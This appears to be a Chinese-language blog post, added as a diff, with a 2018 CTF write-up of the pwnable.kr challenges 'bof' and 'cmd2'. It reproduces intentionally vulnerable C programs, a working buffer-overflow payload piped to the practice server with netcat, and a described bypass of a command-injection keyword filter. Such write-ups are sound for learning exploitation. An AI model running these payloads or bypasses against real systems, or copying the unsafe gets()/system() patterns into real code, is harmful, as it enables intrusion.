@@ -1,0 +1,176 @@
+
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7" lang="en"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8" lang="en"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+    <meta charset="UTF-8">
+    <title>一些题目</title>
+
+    <meta name="author" content="triqry">
+
+    <link rel="shortcut icon" href="/images/favicon.png">
+
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">
+
+    <link rel="canonical" href="http://iruby.me/2018/04/02/Some_Problems/">
+
+    
+
+    
+
+    <script src="/js/modernizr-2.0.js"></script>
+
+    <script src="/js/jquery-1.9.1.js"></script>
+
+    
+    <script>window.twttr = (function(d, s, id) {
+            var js, fjs = d.getElementsByTagName(s)[0],
+                t = window.twttr || {};
+            if (d.getElementById(id)) return t;
+            js = d.createElement(s);
+            js.id = id;
+            js.src = "https://platform.twitter.com/widgets.js";
+            fjs.parentNode.insertBefore(js, fjs);
+
+            t._e = [];
+            t.ready = function(f) {
+                t._e.push(f);
+            };
+
+            return t;
+        }(document, "script", "twitter-wjs"));</script>
+
+    
+    <link rel="me" href="https://twitter.com/dimo233">
+    
+
+
+
+    <script src="/js/octo.js"></script>
+
+    <link rel="stylesheet" href="/css/octo.css">
+
+    <link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet"
+          type="text/css">
+
+    <link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet"
+          type="text/css">
+
+    
+
+</head>
+<body>
+
+<header role="banner">
+    <hgroup>
+        <h1><a href="/">Cold Snap</a></h1>
+        
+            <h2>Quas Quas Quas</h2>
+        
+    </hgroup>
+</header>
+
+<nav role="navigation">
+    
+
+    <form action="http://google.com/search" method="get">
+        <fieldset role="search">
+            <input type="hidden" name="q" value="site:/">
+            <input class="search" type="text" name="q" results="0" placeholder="Search">
+        </fieldset>
+    </form>
+
+    <ul class="main-navigation">
+        
+            <li><a href="/">Blog</a></li>
+        
+            <li><a href="/archives">Archives</a></li>
+        
+            <li><a href="/about">About</a></li>
+        
+            <li><a href="/links">Links</a></li>
+        
+    </ul>
+</nav>
+
+<div id="main">
+    <div id="content">
+        <div>
+    <article class="hentry" role="article">
+        <header>
+            <h1 class="entry-title">一些题目</h1>
+            <p class="meta">
+                <time datetime="2018-04-02T14:22:20.729Z" data-updated="true">Mon Apr 02 2018</time>
+            </p>
+        </header>
+        <div class="entry-content">
+            <p>找了个时间，整理了一些做的题目</p>
+<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这题给了我们源码，由于<code>gets</code>不检查输入长度，我们要做的显然就是通过溢出覆盖key的值。由gdb先试出所要覆盖的长度为52个，由此用python构造payload,唯一要注意的是这里用的是小端序。<br><a id="more"></a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~$ (python -c <span class="string">'print "A" * 52 + "\xbe\xba\xfe\xca"'</span>; cat -) | nc pwnable.kr 9000</span><br><span class="line">cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure></p>
+<p>这里如果不加上 <code>;cat -</code> 则会返回 <code>stack smashing detected</code> ，即触发了缓存保护机制，但是至于为什么加上后会跳过该机制的触发，我还不是很清楚。</p>
+<h2 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h2><p>同样给了我们源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"="</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"PATH"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"export"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"/"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"`"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>** p;</span><br><span class="line">	<span class="keyword">for</span>(p=environ; *p; p++)	<span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	delete_env();</span><br><span class="line">	putenv(<span class="string">"PATH=/no_command_execution_until_you_become_a_hacker"</span>);</span><br><span class="line">	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">	system( argv[<span class="number">1</span>] );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>跟cmd1一样，cmd2同样修改了<code>PATH</code>，无法直接使用<code>cat</code>，并且这次不允许我们直接输入<code>/</code>。用<code>echo</code>构造<code>/</code>应该是可行的，但是当<code>system</code>执行时，却并不会帮你完成转义，即使加上-e，<code>sh</code>也会发生报错（这里的<code>system</code>调用发生在<code>sh</code>，而不是<code>bash</code>），看起来用<code>echo</code>行不通。然后看了一些别人的wp后发现可以用<code>pwd</code>（获取当前目录）的方式构造出<code>/</code>，这里也用到了<code>ln -s</code>（即软链接）的小技巧，即现在<code>/tmp</code>下创造子文件，如<code>/tmp/abc/c</code>,然后就可以用<code>${pwd}at</code>的方式获得<code>/tmp/abc/cat</code>，那么我们只用将这个<code>cat</code>与<code>/bin/cat</code>相链接，并在这个目录下构建与原flag文件相链接的文件即可，也有的wp用的是base64绕过<code>/</code>过滤，应该也是可行的，但我自己还没试过。</p>
+
+        </div>
+        <footer>
+            <p class="meta">
+                <span class="byline author vcard">Posted by <span class="fn">triqry</span></span>
+                <time datetime="2018-04-02T14:22:20.729Z" data-updated="true">Mon Apr 02 2018</time>
+                
+    <span class="categories">
+    
+        <a class="category" href="/tags/pwnable-kr/">pwnable.kr</a>,
+    
+        <a class="category" href="/tags/Toddler-s-Bottle/">Toddler&#39;s Bottle</a>
+    
+    </span>
+
+            </p>
+            <div class="sharing">
+    
+        <a class="twitter-share-button"
+           href="https://twitter.com/intent/tweet?text=%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE">
+            Tweet
+        </a>
+    
+</div>
+
+            <p class="meta">
+                
+
+                
+                <a class="basic-alignment right" href="/2018/04/02/test/index.html" title="Previous Post: test">test »</a>
+                
+            </p>
+        </footer>
+    </article>
+
+    
+
+</div>
+
+<aside class="sidebar">
+    <section class="odd">
+    <h1>Recent Posts</h1>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/04/02/Some_Problems/">一些题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/02/test/">test</a></li></ul>
+</section>
+</aside>
+
+    </div>
+</div>
+
+<footer role="contentinfo">
+    <p>
+        Copyright © 2018 - triqry -
+        <span class="credit">Generated using <a href="https://github.com/jbreckmckye/hexo-theme-octo">Octo theme</a> for <a href="http://hexo.io">Hexo</a></span>
+    </p>
+</footer>
+
+
+
+</body>
+</html>
